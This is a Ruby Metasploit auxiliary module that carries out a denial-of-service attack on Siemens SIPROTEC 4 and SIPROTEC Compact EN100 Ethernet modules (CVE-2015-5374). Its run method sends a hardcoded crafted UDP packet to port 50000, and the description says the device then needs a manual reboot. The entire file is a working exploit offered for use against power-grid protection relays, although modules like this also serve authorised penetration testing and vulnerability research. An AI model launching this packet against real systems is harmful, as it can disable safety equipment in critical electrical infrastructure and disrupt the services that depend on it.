##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos
    def initialize(info = {})
        super(
          'Name'           => 'Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module - Denial of Service',
          'Description'    => %q{
             This module sends a specially crafted packet to port 50000/UDP
             causing a denial of service of the affected (Siemens SIPROTEC 4 and SIPROTEC Compact < V4.25) devices.
             A manual reboot is required to return the device to service.
             CVE-2015-5374 and a CVSS v2 base score of 7.8 have been assigned to this vulnerability.
            },
          'Author'         => [ 'M. Can Kurnaz' ],
          'License'        => MSF_LICENSE,
          'Version'        => '$Revision: 1 $',
          'References'     =>
            [
              [ 'CVE' '2015-5374' ],
              [ 'EDB', '44103' ],
              [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01' ]
            ])
        register_options([Opt::RPORT(50000),])
  end
  def run
      connect_udp
      pckt = "\x11\x49\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x9e"
      print_status('Sending DoS packet...')
      udp_sock.put(pckt)
      disconnect_udp
  end
end

